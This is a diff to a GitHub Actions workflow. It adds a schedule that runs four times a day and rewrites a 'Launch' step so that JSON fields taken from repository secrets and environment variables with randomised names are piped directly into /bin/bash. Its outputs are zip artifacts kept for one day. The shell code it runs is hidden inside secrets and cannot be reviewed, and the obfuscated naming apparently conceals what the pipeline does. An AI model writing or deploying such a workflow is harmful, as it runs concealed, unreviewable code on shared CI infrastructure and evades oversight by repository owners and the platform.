@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '10 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,16 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          xitw0: ${{ secrets.xitw0 }}
+          ukt2509: ${{ secrets.ukt2509 }}
         run: |
-          printf '%s' "$xitw0" | jq -r .fja948 | /bin/bash
-          printf '%s' "$lyt3" | jq -r .v7761 | /bin/bash
-          printf '%s' "$fw74" | jq -r .p83 | /bin/bash
-          printf '%s' "$o2664" | jq -r .lp37464 | /bin/bash
+          printf '%s' "$ukt2509" | jq -r .m08 | /bin/bash
+          echo $roesv45099 | jq -r .lrwm6386 | /bin/bash
+          echo $k49 | jq -r .mr01 | /bin/bash
+          printf '%s' "$zeuel86" | jq -r .dyvj60 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: lZy6kYHD
+          name: yDb3vzSg
           path: "*.zip"
           retention-days: 1
